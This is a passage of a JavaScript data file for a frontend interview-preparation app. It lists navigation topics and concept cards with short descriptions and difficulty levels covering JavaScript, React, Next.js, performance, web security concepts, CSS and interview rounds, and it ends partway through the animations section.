export const TOPICS = [
  { id: 'home', icon: '⌂', label: 'Dashboard', section: 'START' },

  // ── JAVASCRIPT ──────────────────────────────────────────
  { id: 'js-core', icon: '⚡', label: 'JS Internals', section: 'JAVASCRIPT', badge: 'HOT' },
  { id: 'async', icon: '↺', label: 'Async & Promises', section: null },
  { id: 'closures', icon: '□', label: 'Closures & Scope', section: null },
  { id: 'prototypes', icon: '◈', label: 'Prototypes & OOP', section: null },
  { id: 'js-advanced', icon: '🔥', label: 'Advanced JS', section: null, badge: 'HOT' },
  { id: 'ts', icon: '𝕋', label: 'TypeScript', section: null, badge: 'NEW' },

  // ── REACT ────────────────────────────────────────────────
  { id: 'react-core', icon: '⊛', label: 'React Internals', section: 'REACT', badge: 'HOT' },
  { id: 'hooks', icon: '↯', label: 'Hooks & State', section: null },
  { id: 'react-patterns', icon: '◆', label: 'React Patterns', section: null },
  { id: 'react-performance', icon: '⏱', label: 'React Performance', section: null },
  { id: 'nextjs', icon: '▲', label: 'Next.js', section: null, badge: 'NEW' },

  // ── ADVANCED ─────────────────────────────────────────────
  { id: 'perf', icon: '📊', label: 'Performance & CWV', section: 'ADVANCED', badge: '🔥' },
  { id: 'network', icon: '⊡', label: 'Network & HTTP', section: null },
  { id: 'security', icon: '⬡', label: 'Security', section: null, badge: 'HOT' },
  { id: 'browser', icon: '◉', label: 'Browser Internals', section: null },
  { id: 'devtools', icon: '⊟', label: 'DevTools & Debugging', section: null },

  // ── UI ───────────────────────────────────────────────────
  { id: 'css-adv', icon: '◑', label: 'CSS Architecture', section: 'CSS & UI', badge: 'NEW' },
  { id: 'animations', icon: '◐', label: 'Animations & GPU', section: null },
  { id: 'a11y', icon: '◇', label: 'Accessibility', section: null },
  { id: 'html-q', icon: '⬡', label: 'HTML Deep Dive', section: null },

  // ── ARCHITECTURE ─────────────────────────────────────────
  { id: 'system-design', icon: '⋈', label: 'System Design', section: 'ARCHITECTURE', badge: 'HOT' },
  { id: 'patterns', icon: '◆', label: 'Design Patterns', section: null },
  { id: 'state-mgmt', icon: '🗄', label: 'State Management', section: null },
  { id: 'testing', icon: '✓', label: 'Testing Strategy', section: null },
  { id: 'bundlers', icon: '⊞', label: 'Build Tools', section: null },

  // ── INTERVIEW ROUNDS ─────────────────────────────────────
  { id: 'js-interview', icon: '⚡', label: 'JS Interview Round', section: 'INTERVIEW ROUNDS', badge: 'HOT' },
  { id: 'react-interview', icon: '⚛', label: 'React Interview Round', section: null, badge: 'HOT' },
  { id: 'system-design-interview', icon: '🏗', label: 'System Design Round', section: null },
  { id: 'machine-coding', icon: '💻', label: 'Machine Coding Round', section: null, badge: 'HOT' },
  { id: 'debugging-round', icon: '🔧', label: 'Debugging Round', section: null },
  { id: 'perf-interview', icon: '📊', label: 'Performance Round', section: null },
  { id: 'security-interview', icon: '🔒', label: 'Security Round', section: null },
  // { id: 'behavioral-round', icon: '🎤', label: 'Behavioral Round', section: null },
  { id: 'rapid-fire', icon: '⚡', label: 'Rapid Fire (50 Qs)', section: null, badge: 'NEW' },

  { id: 'leaderboard', icon: '🏆', label: 'Leaderboard', section: 'COMMUNITY' },
];

export const LEARNABLE_IDS = TOPICS.filter(t => t.id !== 'home' && t.id !== 'leaderboard').map(t => t.id);

export const CONCEPTS = {
  'js-core': {
    title: 'JavaScript Internals', color: '#eab308',
    items: [
      { id: 'event-loop', title: 'Event Loop & Call Stack', desc: 'How JS handles async with microtasks, macrotasks, and the execution context queue.', diff: 'hard' },
      { id: 'hoisting', title: 'Hoisting & TDZ', desc: 'Variable and function declaration hoisting, temporal dead zones, and let/const vs var.', diff: 'medium' },
      { id: 'coercion', title: 'Type Coercion & Equality', desc: 'Abstract equality, strict equality, and implicit type conversion rules.', diff: 'medium' },
      { id: 'generators', title: 'Generators & Iterators', desc: 'Generator functions, Symbol.iterator protocol, and lazy evaluation.', diff: 'hard' },
      { id: 'memory', title: 'Memory Management & GC', desc: 'Heap vs stack, garbage collection algorithms, memory leaks, WeakMap/WeakRef.', diff: 'hard' },
      { id: 'this-keyword', title: 'this Binding Rules', desc: 'Default, implicit, explicit (call/apply/bind), and new binding. Arrow functions.', diff: 'medium' },
    ],
  },
  'async': {
    title: 'Async & Promises', color: '#06b6d4',
    items: [
      { id: 'promise-internals', title: 'Promise Internals', desc: 'How Promises work under the hood — states, microtask queue, chaining.', diff: 'hard' },
      { id: 'async-await', title: 'async/await Patterns', desc: 'Error handling, parallel execution, race conditions, and Promise.all variants.', diff: 'medium' },
      { id: 'rxjs-basics', title: 'Observables vs Promises', desc: 'RxJS, hot/cold observables, operators, and when to use each.', diff: 'hard' },
      { id: 'web-workers', title: 'Web Workers & SharedArrayBuffer', desc: 'Off-main-thread computation, message passing, and structured clone.', diff: 'hard' },
    ],
  },
  'closures': {
    title: 'Closures & Scope', color: '#a855f7',
    items: [
      { id: 'closure-def', title: 'Closures Explained', desc: 'Lexical environment, closure over variables, common interview patterns.', diff: 'medium' },
      { id: 'module-pattern', title: 'Module Pattern & IIFE', desc: 'Private state with closures, revealing module pattern, ES modules.', diff: 'medium' },
      { id: 'scope-chain', title: 'Scope Chain & Lexical Scope', desc: 'How JS resolves variable lookups, scope chain traversal.', diff: 'easy' },
    ],
  },
  'react-core': {
    title: 'React Internals', color: '#4facfe',
    items: [
      { id: 'fiber', title: 'React Fiber Architecture', desc: 'Reconciliation, fiber nodes, work-in-progress tree, and concurrent mode.', diff: 'hard' },
      { id: 'virtual-dom', title: 'Virtual DOM & Diffing', desc: 'How React diffs trees, key prop importance, and when reconciliation is skipped.', diff: 'medium' },
      { id: 'render-cycle', title: 'Render Cycle & Batching', desc: 'When renders trigger, React 18 automatic batching, flushSync.', diff: 'medium' },
      { id: 'context-perf', title: 'Context Performance Pitfalls', desc: 'Why Context causes rerenders and patterns to optimize: splitting, memo, useMemo.', diff: 'hard' },
    ],
  },
  'hooks': {
    title: 'Hooks & State', color: '#00ff88',
    items: [
      { id: 'useeffect-deep', title: 'useEffect Deep Dive', desc: 'Dependency arrays, cleanup, stale closures, and the rules of hooks.', diff: 'hard' },
      { id: 'custom-hooks', title: 'Custom Hook Patterns', desc: 'Building reusable hooks: useFetch, useDebounce, useIntersectionObserver.', diff: 'medium' },
      { id: 'state-management', title: 'State Architecture', desc: 'When to use useState, useReducer, Zustand, Redux. Derived state patterns.', diff: 'hard' },
    ],
  },
  'perf': {
    title: 'Performance & Core Web Vitals', color: '#f97316',
    items: [
      { id: 'cwv', title: 'Core Web Vitals (LCP/INP/CLS)', desc: 'Measuring LCP, INP, CLS, TTFB. How each impacts SEO and user experience.', diff: 'medium' },
      { id: 'code-splitting', title: 'Code Splitting & Lazy Loading', desc: 'Dynamic import(), React.lazy, route-based splitting, prefetch strategies.', diff: 'medium' },
      { id: 'rendering-patterns', title: 'SSR vs SSG vs CSR vs ISR', desc: 'Rendering strategies, hydration, streaming SSR, and when to use each.', diff: 'hard' },
      { id: 'virtualization', title: 'Virtualization & Windowing', desc: 'react-virtual, infinite scroll, rendering 100k items without frame drops.', diff: 'hard' },
      { id: 'memoization', title: 'Memoization Patterns', desc: 'useMemo, useCallback, React.memo — when they help and when they hurt.', diff: 'medium' },
    ],
  },
  'security': {
    title: 'Security', color: '#ef4444',
    items: [
      { id: 'xss', title: 'XSS Attacks & Prevention', desc: 'Stored, reflected, DOM-based XSS. CSP headers, sanitization, innerHTML risks.', diff: 'hard' },
      { id: 'csrf', title: 'CSRF & Same-Origin Policy', desc: 'CSRF attacks, SameSite cookies, CORS preflight, and token patterns.', diff: 'hard' },
      { id: 'auth-patterns', title: 'Auth Patterns (JWT/Sessions)', desc: 'JWT vulnerabilities, httpOnly cookies, refresh token rotation, OAuth flow.', diff: 'hard' },
    ],
  },
  'network': {
    title: 'Network & HTTP', color: '#06b6d4',
    items: [
      { id: 'http2-3', title: 'HTTP/2 & HTTP/3', desc: 'Multiplexing, header compression, QUIC, and server push. What changed.', diff: 'medium' },
      { id: 'caching', title: 'Caching Strategies', desc: 'Cache-Control, ETags, stale-while-revalidate, service worker caching.', diff: 'medium' },
      { id: 'websockets', title: 'WebSockets & SSE', desc: 'Real-time protocols, when to use WebSocket vs SSE vs polling.', diff: 'medium' },
    ],
  },
  'browser': {
    title: 'Browser Internals', color: '#a855f7',
    items: [
      { id: 'rendering-pipeline', title: 'Browser Rendering Pipeline', desc: 'Parse HTML → CSSOM → Render tree → Layout → Paint → Composite.', diff: 'hard' },
      { id: 'reflow-repaint', title: 'Reflow vs Repaint', desc: 'What triggers each, how to avoid layout thrashing, will-change, CSS containment.', diff: 'medium' },
      { id: 'storage', title: 'Storage APIs', desc: 'localStorage, sessionStorage, IndexedDB, cookies, Cache API — differences.', diff: 'easy' },
    ],
  },
  'system-design': {
    title: 'System Design', color: '#f97316',
    items: [
      { id: 'component-design', title: 'Scalable Component Design', desc: 'Composition patterns, polymorphism, render props, compound components.', diff: 'hard' },
      { id: 'micro-frontends', title: 'Micro-frontends', desc: 'Module federation, iframe isolation, routing strategies, shared state.', diff: 'hard' },
      { id: 'design-system', title: 'Design System Architecture', desc: 'Token systems, component APIs, versioning, accessibility compliance.', diff: 'hard' },
    ],
  },
  'testing': {
    title: 'Testing Strategy', color: '#00ff88',
    items: [
      { id: 'testing-pyramid', title: 'Testing Pyramid', desc: 'Unit, integration, e2e — when to use each, cost vs confidence tradeoffs.', diff: 'medium' },
      { id: 'react-testing', title: 'React Testing Library', desc: 'Testing by user behavior, queries, async utilities, mocking.', diff: 'medium' },
      { id: 'mocking', title: 'Mocking & Test Doubles', desc: 'Spies, stubs, mocks, fakes — MSW for API mocking.', diff: 'hard' },
    ],
  },
  // ── ADD TO CONCEPTS OBJECT ────────────────────────────────────────────

  'js-advanced': {
    title: 'Advanced JavaScript', color: '#f97316',
    items: [
      { id: 'execution-context', title: 'Execution Context & Call Stack', desc: 'How JS creates and manages execution contexts, the call stack, and scope chains.', diff: 'hard' },
      { id: 'deep-clone', title: 'Deep Cloning Techniques', desc: 'structuredClone, JSON tricks, recursive clone, and when each breaks.', diff: 'medium' },
      { id: 'proxy-reflect', title: 'Proxy & Reflect APIs', desc: 'Intercepting object operations for validation, reactivity, and metaprogramming.', diff: 'hard' },
      { id: 'generators-adv', title: 'Generators & Async Iterators', desc: 'yield, generator protocols, async generators, and lazy evaluation patterns.', diff: 'hard' },
      { id: 'weak-refs', title: 'WeakMap, WeakSet & WeakRef', desc: 'Memory-safe collections, when to use them, and garbage collection implications.', diff: 'hard' },
      { id: 'currying', title: 'Currying & Partial Application', desc: 'Converting multi-arg functions, point-free style, and functional composition.', diff: 'hard' },
      { id: 'symbols', title: 'Symbols & Well-Known Symbols', desc: 'Symbol.iterator, Symbol.toPrimitive, and customizing JS built-in behavior.', diff: 'hard' },
      { id: 'race-conditions', title: 'Race Conditions in Frontend', desc: 'Identifying and fixing async race conditions — stale responses, state mismatches.', diff: 'hard' },
    ],
  },

  'ts': {
    title: 'TypeScript Deep Dive', color: '#4facfe',
    items: [
      { id: 'ts-basics', title: 'interface vs type', desc: 'Declaration merging, extends vs intersections, when to use each.', diff: 'medium' },
      { id: 'ts-generics', title: 'Generics', desc: 'Generic constraints, conditional types, infer keyword, and real-world patterns.', diff: 'hard' },
      { id: 'ts-utility', title: 'Utility Types', desc: 'Partial, Required, Pick, Omit, ReturnType, Parameters — all with examples.', diff: 'medium' },
      { id: 'ts-advanced', title: 'any vs unknown vs never', desc: 'The type hierarchy, type safety implications, and when to use each.', diff: 'hard' },
      { id: 'ts-guards', title: 'Type Guards & Narrowing', desc: 'typeof, instanceof, discriminated unions, user-defined type guards.', diff: 'hard' },
      { id: 'ts-mapped', title: 'Mapped & Conditional Types', desc: 'Building dynamic types, template literal types, and recursive types.', diff: 'hard' },
    ],
  },

  'react-patterns': {
    title: 'React Patterns', color: '#4facfe',
    items: [
      { id: 'hoc-pattern', title: 'Higher-Order Components', desc: 'Wrapping components for reusability, cross-cutting concerns, and limitations.', diff: 'medium' },
      { id: 'render-props', title: 'Render Props Pattern', desc: 'Sharing logic via function props, comparison with hooks, when still useful.', diff: 'medium' },
      { id: 'compound-components', title: 'Compound Components', desc: 'Context-based component APIs, implicit state sharing, real-world examples.', diff: 'hard' },
      { id: 'controlled-uncontrolled', title: 'Controlled vs Uncontrolled', desc: 'Form state ownership, useRef for uncontrolled, when each is appropriate.', diff: 'medium' },
      { id: 'error-boundaries', title: 'Error Boundaries', desc: 'Class-based error catching, fallback UI, error reporting strategies.', diff: 'medium' },
      { id: 'portals-pattern', title: 'React Portals', desc: 'Rendering outside DOM hierarchy, modals, tooltips, event bubbling behavior.', diff: 'medium' },
      { id: 'suspense-pattern', title: 'Suspense & Lazy Loading', desc: 'React.lazy, Suspense boundaries, error boundaries combined.', diff: 'hard' },
      { id: 'forward-ref', title: 'forwardRef & useImperativeHandle', desc: 'Exposing DOM refs to parents, imperative APIs, when to use them.', diff: 'hard' },
    ],
  },

  'react-performance': {
    title: 'React Performance', color: '#00ff88',
    items: [
      { id: 'memo-patterns', title: 'React.memo & Memoization', desc: 'When memo prevents re-renders, shallow comparison pitfalls, over-memoizing.', diff: 'hard' },
      { id: 'rerender-causes', title: 'What Causes Re-renders?', desc: 'State changes, new prop references, context updates, parent re-renders.', diff: 'hard' },
      { id: 'context-optimization', title: 'Context Performance', desc: 'Splitting context, memoizing value, selector patterns, Zustand comparison.', diff: 'hard' },
      { id: 'state-batching', title: 'State Batching in React 18', desc: 'Automatic batching, flushSync, concurrent features interaction.', diff: 'hard' },
      { id: 'virtualization', title: 'List Virtualization', desc: 'react-virtual, TanStack Virtual, windowing 100k rows without lag.', diff: 'hard' },
      { id: 'concurrent-features', title: 'Concurrent Features', desc: 'useTransition, useDeferredValue, Suspense — and when to use each.', diff: 'hard' },
      { id: 'hydration-issues', title: 'Hydration & Mismatches', desc: 'What causes hydration errors, suppressHydrationWarning, debugging strategies.', diff: 'hard' },
    ],
  },

  'nextjs': {
    title: 'Next.js', color: '#e2e8f0',
    items: [
      { id: 'app-router', title: 'App Router vs Pages Router', desc: 'Layout system, nested routing, Server Components by default, migration.', diff: 'hard' },
      { id: 'server-components', title: 'React Server Components', desc: 'Server vs client components, when to use each, serialization limits.', diff: 'hard' },
      { id: 'nextjs-caching', title: 'Next.js Caching', desc: 'Request memoization, data cache, full-route cache, router cache — all 4 layers.', diff: 'hard' },
      { id: 'server-actions', title: 'Server Actions', desc: 'Progressive enhancement forms, mutations, revalidation, security.', diff: 'hard' },
      { id: 'nextjs-image', title: 'Image Optimization', desc: 'next/image internals, lazy loading, blur placeholder, formats.', diff: 'medium' },
      { id: 'edge-functions', title: 'Edge Functions & Middleware', desc: 'Edge runtime, middleware use cases, geolocation, A/B testing.', diff: 'hard' },
    ],
  },

  'html-q': {
    title: 'HTML Deep Dive', color: '#f97316',
    items: [
      { id: 'semantic-html', title: 'Semantic HTML', desc: 'Why semantics matter for SEO, accessibility, and maintainability.', diff: 'easy' },
      { id: 'async-defer', title: 'async vs defer in Script Loading', desc: 'How each affects parsing, execution order, and when to use each.', diff: 'medium' },
      { id: 'critical-rendering', title: 'Critical Rendering Path', desc: 'HTML parsing, CSSOM, render tree, layout, paint — and how to optimize.', diff: 'hard' },
      { id: 'web-components-html', title: 'Web Components', desc: 'Custom elements, Shadow DOM, HTML templates, and adoption in 2024.', diff: 'hard' },
      { id: 'shadow-dom', title: 'DOM vs Shadow DOM', desc: 'Encapsulation, styling isolation, slot elements, and use cases.', diff: 'hard' },
      { id: 'meta-performance', title: 'meta, preload, prefetch, preconnect', desc: 'Resource hints, their impact on load order, and best practices.', diff: 'medium' },
    ],
  },

  'state-mgmt': {
    title: 'State Management', color: '#a855f7',
    items: [
      { id: 'redux-arch', title: 'Redux Architecture', desc: 'Store, actions, reducers, middleware — and why Redux Toolkit replaced Redux.', diff: 'hard' },
      { id: 'zustand-vs-redux', title: 'Zustand vs Redux', desc: 'API comparison, bundle size, DevTools, when each fits.', diff: 'medium' },
      { id: 'react-query-vs-redux', title: 'React Query vs Redux', desc: 'Server state vs client state, caching, optimistic updates, staleness.', diff: 'hard' },
      { id: 'optimistic-updates', title: 'Optimistic Updates', desc: 'Updating UI before server confirms, rollback on error, UX patterns.', diff: 'hard' },
      { id: 'normalized-state', title: 'Normalized State', desc: 'Flat data structures, entity adapters, preventing duplication.', diff: 'hard' },
      { id: 'stale-while-revalidate', title: 'Stale-While-Revalidate', desc: 'Cache strategy, HTTP header, React Query implementation.', diff: 'medium' },
    ],
  },

  // ── INTERVIEW ROUNDS ──────────────────────────────────────────────────

  'js-interview': {
    title: 'JS Interview Round', color: '#eab308',
    items: [
      { id: 'ji-var-let-const', title: 'var vs let vs const', desc: 'Scope, hoisting, TDZ, reassignment — what interviewers actually test.', diff: 'easy' },
      { id: 'ji-closures', title: 'Closures (Interview Style)', desc: 'The classic loop bug, private state, memoization — all common interview patterns.', diff: 'medium' },
      { id: 'ji-event-loop', title: 'Event Loop Output Questions', desc: 'Print the output: setTimeout vs Promise vs sync code ordering.', diff: 'hard' },
      { id: 'ji-this', title: 'this Keyword Traps', desc: 'Lost binding, arrow vs regular, class methods — common gotchas.', diff: 'hard' },
      { id: 'ji-prototype', title: 'Prototypal Inheritance', desc: 'Prototype chain, Object.create, class sugar, instanceof checks.', diff: 'hard' },
      { id: 'ji-promises', title: 'Promise Chaining & Traps', desc: 'Missing return, error swallowing, Promise.all failure — classic mistakes.', diff: 'hard' },
      { id: 'ji-coercion', title: 'Type Coercion Surprises', desc: '[] + {}, null == undefined, typeof null — the weird ones they ask.', diff: 'medium' },
      { id: 'ji-immutability', title: 'Immutability & Object.freeze', desc: 'Shallow vs deep immutability, freeze vs seal, const misconception.', diff: 'medium' },
      { id: 'ji-debounce', title: 'Implement Debounce/Throttle', desc: 'Write it from scratch. Add leading/trailing. Explain use cases.', diff: 'hard' },
      { id: 'ji-currying', title: 'Currying & Composition', desc: 'Implement curry(), compose(), pipe() — common FAANG coding questions.', diff: 'hard' },
    ],
  },

  'react-interview': {
    title: 'React Interview Round', color: '#4facfe',
    items: [
      { id: 'ri-reconciliation', title: 'Reconciliation & Keys', desc: 'How React diffs, why keys matter, what happens with index keys.', diff: 'hard' },
      { id: 'ri-fiber', title: 'React Fiber Explanation', desc: 'What Fiber is, interruptible rendering, render vs commit phase.', diff: 'hard' },
      { id: 'ri-useeffect', title: 'useEffect Deep Dive', desc: 'Deps array, stale closures, cleanup — every possible gotcha.', diff: 'hard' },
      { id: 'ri-rerenders', title: 'Debugging Re-renders', desc: 'Find what\'s causing extra renders, fix with memo/useMemo/useCallback.', diff: 'hard' },
      { id: 'ri-context', title: 'Context API Performance', desc: 'Why context causes re-renders, how to fix, alternatives.', diff: 'hard' },
      { id: 'ri-hooks-rules', title: 'Rules of Hooks & Why', desc: 'Why you can\'t call hooks conditionally — the internal array explanation.', diff: 'hard' },
      { id: 'ri-batching', title: 'State Batching Questions', desc: 'React 17 vs 18 batching, flushSync, concurrent mode effects.', diff: 'hard' },
      { id: 'ri-custom-hooks', title: 'Custom Hook Patterns', desc: 'useFetch, useDebounce, useLocalStorage, useIntersectionObserver.', diff: 'medium' },
      { id: 'ri-patterns', title: 'Component Design Patterns', desc: 'HOC vs render props vs hooks — when each is the right choice.', diff: 'hard' },
      { id: 'ri-concurrent', title: 'React 18 Concurrent Features', desc: 'useTransition, useDeferredValue, Suspense — practical use cases.', diff: 'hard' },
    ],
  },

  'machine-coding': {
    title: 'Machine Coding Round', color: '#00ff88',
    items: [
      { id: 'mc-debounce', title: 'Implement Debounce', desc: 'Build from scratch with leading/trailing edge options.', diff: 'medium' },
      { id: 'mc-autocomplete', title: 'Autocomplete Search', desc: 'Debounced input, async suggestions, keyboard navigation, highlight matches.', diff: 'hard' },
      { id: 'mc-infinite-scroll', title: 'Infinite Scroll', desc: 'IntersectionObserver, pagination, loading states, error handling.', diff: 'hard' },
      { id: 'mc-modal', title: 'Modal Component', desc: 'Portal, focus trap, keyboard close, backdrop click, animations.', diff: 'medium' },
      { id: 'mc-usefetch', title: 'useFetch Custom Hook', desc: 'Loading/error/data states, AbortController cleanup, retry logic.', diff: 'medium' },
      { id: 'mc-virtual-list', title: 'Virtual Scroll List', desc: 'Render only visible items, dynamic heights, scroll restoration.', diff: 'hard' },
      { id: 'mc-toast', title: 'Toast Notification System', desc: 'Queue management, auto-dismiss, positions, animation in/out.', diff: 'hard' },
      { id: 'mc-kanban', title: 'Kanban Board', desc: 'Drag and drop, column management, optimistic updates.', diff: 'hard' },
      { id: 'mc-multistep-form', title: 'Multi-Step Form', desc: 'Step navigation, validation per step, progress indicator, review step.', diff: 'hard' },
      { id: 'mc-rbac', title: 'Role-Based Access Control', desc: 'Route guards, permission checks, component-level hiding, JWT roles.', diff: 'hard' },
    ],
  },

  'debugging-round': {
    title: 'Debugging Round', color: '#eab308',
    items: [
      { id: 'db-react-renders', title: 'Debug Unnecessary Re-renders', desc: 'React DevTools Profiler, why-did-you-render, finding the culprit.', diff: 'hard' },
      { id: 'db-memory-leak', title: 'Debug Memory Leaks', desc: 'Chrome heap snapshots, detached DOM nodes, closure leaks, listener leaks.', diff: 'hard' },
      { id: 'db-network', title: 'Analyze Network Waterfall', desc: 'Reading timing tabs, identifying bottlenecks, TTFB vs download.', diff: 'medium' },
      { id: 'db-performance', title: 'Trace Performance Bottlenecks', desc: 'Flame charts, long tasks, layout thrashing detection in DevTools.', diff: 'hard' },
      { id: 'db-hydration', title: 'Debug Hydration Errors', desc: 'Why mismatches happen, reading React error messages, suppressHydrationWarning.', diff: 'hard' },
      { id: 'db-production', title: 'Debug Production-Only Bugs', desc: 'Source maps, error monitoring, feature flags for reproduction.', diff: 'hard' },
      { id: 'db-stale-closure', title: 'Debug Stale Closure Bugs', desc: 'Identifying stale values in effects, exhaustive deps, useRef solution.', diff: 'hard' },
    ],
  },

  'perf-interview': {
    title: 'Performance Round', color: '#f97316',
    items: [
      { id: 'pi-cwv', title: 'Core Web Vitals Explained', desc: 'LCP, INP, CLS — targets, measurement, and specific fixes for each.', diff: 'medium' },
      { id: 'pi-bundle', title: 'Bundle Size Optimization', desc: 'Tree shaking, code splitting, dynamic imports, bundle analyzer.', diff: 'hard' },
      { id: 'pi-images', title: 'Image Optimization', desc: 'WebP/AVIF, lazy loading, srcset, next/image internals, LCP impact.', diff: 'medium' },
      { id: 'pi-lighthouse', title: 'Lighthouse & DevTools', desc: 'Reading reports, which scores matter, actionable improvements.', diff: 'medium' },
      { id: 'pi-caching', title: 'Caching Strategies', desc: 'Cache-Control headers, ETags, stale-while-revalidate, service workers.', diff: 'hard' },
      { id: 'pi-rendering', title: 'Rendering Strategy Choice', desc: 'When to choose SSR/SSG/CSR/ISR — with trade-off reasoning.', diff: 'hard' },
      { id: 'pi-compression', title: 'Gzip, Brotli & HTTP/2', desc: 'Compression algorithms, multiplexing, header compression, QUIC.', diff: 'medium' },
    ],
  },

  'security-interview': {
    title: 'Security Round', color: '#ef4444',
    items: [
      { id: 'si-xss', title: 'XSS Deep Dive', desc: 'All 3 types, attack vectors, CSP, DOMPurify, React dangerouslySetInnerHTML.', diff: 'hard' },
      { id: 'si-csrf', title: 'CSRF Prevention', desc: 'How attacks work, SameSite cookies, CSRF tokens, double-submit pattern.', diff: 'hard' },
      { id: 'si-jwt', title: 'JWT Security', desc: 'Storage (localStorage vs httpOnly cookie), none algorithm attack, refresh rotation.', diff: 'hard' },
      { id: 'si-cors', title: 'CORS Explained', desc: 'Same-origin policy, preflight requests, credentials, security risks.', diff: 'hard' },
      { id: 'si-csp', title: 'Content Security Policy', desc: 'Directives, nonce-based CSP, report-uri, implementing in Express.', diff: 'hard' },
      { id: 'si-headers', title: 'Security Headers', desc: 'HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.', diff: 'medium' },
      { id: 'si-oauth', title: 'OAuth 2.0 & PKCE', desc: 'Authorization code flow, implicit vs PKCE, state parameter, token storage.', diff: 'hard' },
    ],
  },

  'behavioral-round': {
    title: 'Behavioral Round', color: '#a855f7',
    items: [
      { id: 'br-intro', title: 'Tell Me About Yourself', desc: 'Structure: current role → key achievements → why this opportunity.', diff: 'easy' },
      { id: 'br-challenge', title: 'Describe a Challenging Bug', desc: 'STAR format: Situation, Task, Action, Result — technical depth expected.', diff: 'medium' },
      { id: 'br-perf-win', title: 'Performance Win You Led', desc: 'Metrics before/after, your specific contribution, what you learned.', diff: 'medium' },
      { id: 'br-conflict', title: 'Technical Disagreement', desc: 'How to disagree professionally, data-driven decisions, outcome focus.', diff: 'medium' },
      { id: 'br-mentoring', title: 'Mentoring Junior Devs', desc: 'Code reviews, pair programming, documentation, psychological safety.', diff: 'easy' },
      { id: 'br-tech-debt', title: 'Managing Technical Debt', desc: 'How to quantify, prioritize, and pitch tech debt work to stakeholders.', diff: 'hard' },
      { id: 'br-outage', title: 'Production Outage Story', desc: 'Incident response, RCA, blameless postmortem, prevention measures.', diff: 'hard' },
      { id: 'br-leadership', title: 'Senior Engineer Qualities', desc: 'Technical depth + breadth, mentorship, system thinking, ownership.', diff: 'easy' },
    ],
  },

  'rapid-fire': {
    title: 'Rapid Fire — 50 Questions', color: '#ef4444',
    items: [
      { id: 'rf-null-undefined', title: 'null vs undefined', desc: 'When each appears, typeof results, equality comparison.', diff: 'easy' },
      { id: 'rf-debounce-throttle', title: 'Debounce vs Throttle', desc: 'When to use which — one sentence each.', diff: 'easy' },
      { id: 'rf-event-loop-1min', title: 'Event Loop in 60 Seconds', desc: 'Quick, clear explanation — practice for rapid-fire rounds.', diff: 'medium' },
      { id: 'rf-closure', title: 'What is a Closure?', desc: 'One sentence definition + one line example.', diff: 'easy' },
      { id: 'rf-hoisting', title: 'What is Hoisting?', desc: 'Quick answer: what hoists, what doesn\'t, what\'s TDZ.', diff: 'easy' },
      { id: 'rf-map-foreach', title: 'map vs forEach', desc: 'Return value difference, use cases, chaining.', diff: 'easy' },
      { id: 'rf-memoization', title: 'What is Memoization?', desc: 'Cache function results. Pure functions only. useMemo example.', diff: 'easy' },
      { id: 'rf-hydration', title: 'What is Hydration?', desc: 'Attaching React event listeners to server-rendered HTML.', diff: 'medium' },
      { id: 'rf-reconciliation', title: 'What is Reconciliation?', desc: 'React\'s diffing algorithm to determine minimal DOM updates.', diff: 'medium' },
      { id: 'rf-lazy-loading', title: 'What is Lazy Loading?', desc: 'Defer loading resources until needed. Images, routes, components.', diff: 'easy' },
      { id: 'rf-tree-shaking', title: 'What is Tree Shaking?', desc: 'Dead code elimination by bundler using ES module static analysis.', diff: 'easy' },
      { id: 'rf-ssr', title: 'What is SSR?', desc: 'HTML generated on server per request. Good for SEO and FCP.', diff: 'easy' },
      { id: 'rf-csr', title: 'What is CSR?', desc: 'HTML built in browser via JS. Fast navigation, slow initial load.', diff: 'easy' },
      { id: 'rf-auth-authz', title: 'Authentication vs Authorization', desc: 'Auth = who are you. Authz = what can you do.', diff: 'easy' },
      { id: 'rf-cors', title: 'What is CORS?', desc: 'Browser security allowing/blocking cross-origin requests via headers.', diff: 'medium' },
      { id: 'rf-xss', title: 'What is XSS?', desc: 'Attacker runs script in your app. Use textContent, CSP, sanitize.', diff: 'easy' },
      { id: 'rf-csrf', title: 'What is CSRF?', desc: 'Tricks user into making authenticated request. SameSite cookie fixes it.', diff: 'medium' },
      { id: 'rf-optimistic-ui', title: 'What is Optimistic UI?', desc: 'Update UI immediately before server confirms. Roll back on error.', diff: 'medium' },
      { id: 'rf-virtualization', title: 'What is Virtualization?', desc: 'Only render visible list items. React Virtual, TanStack Virtual.', diff: 'medium' },
      { id: 'rf-code-splitting', title: 'What is Code Splitting?', desc: 'Break bundle into chunks loaded on demand. React.lazy + Suspense.', diff: 'easy' },
    ],
  },
  'css-adv': {
    title: 'CSS Architecture', color: '#818cf8',
    items: [
      { id: 'css-specificity', title: 'CSS Specificity & Cascade', desc: 'How browsers resolve conflicting styles — specificity, inheritance, and the cascade algorithm.', diff: 'medium' },
      { id: 'css-layout', title: 'Flexbox & Grid Deep Dive', desc: 'Advanced layout patterns, alignment tricks, and when to use each.', diff: 'medium' },
      { id: 'css-bem', title: 'BEM & CSS Naming Methodologies', desc: 'Block-Element-Modifier, SMACSS, OOCSS — organizing CSS at scale.', diff: 'medium' },
      { id: 'css-variables', title: 'CSS Custom Properties', desc: 'CSS variables, dynamic theming, and runtime style updates.', diff: 'easy' },
      { id: 'css-in-js', title: 'CSS-in-JS vs CSS Modules', desc: 'Styled-components, Emotion, CSS Modules — trade-offs and when to use each.', diff: 'medium' },
      { id: 'css-container', title: 'Container Queries & Modern CSS', desc: 'Container queries, :has(), @layer, logical properties — the future of CSS.', diff: 'hard' },
      { id: 'css-perf', title: 'CSS Performance', desc: 'Render-blocking CSS, critical CSS extraction, will-change, content-visibility.', diff: 'hard' },
      { id: 'css-dark-mode', title: 'Dark Mode Implementation', desc: 'prefers-color-scheme, CSS variables strategy, system vs manual toggle.', diff: 'medium' },
    ],
  },

  'animations': {
    title: 'Animations & GPU', color: '#f97316',
    items: [
      { id: 'css-transitions', title: 'CSS Transitions vs Animations', desc: 'When to use transition vs @keyframes animation — timing functions, fill modes.', diff: 'easy' },
      { id: 'gpu-acceleration', title: 'GPU Acceleration & Compositing', desc: 'will-change, transform vs top/left, compositor layers, avoiding paint.', diff: 'hard' },
      { id: 'animation-perf', title: 'Animation Performance', desc: '60fps animations, measuring jank, Chrome DevTools Performance panel for animations.', diff: 'hard' },
      { id: 'css-keyframes', title: 'Keyframe Animations', desc: '@keyframes, animation shorthand, staggering, chaining, and JS-controlled animations.', diff: 'medium' },
      { id: 'web-animations', title: 'Web Animations API', desc: 'element.animate(), keyframe effects, timing options, play/pause control.', diff: 'hard' },
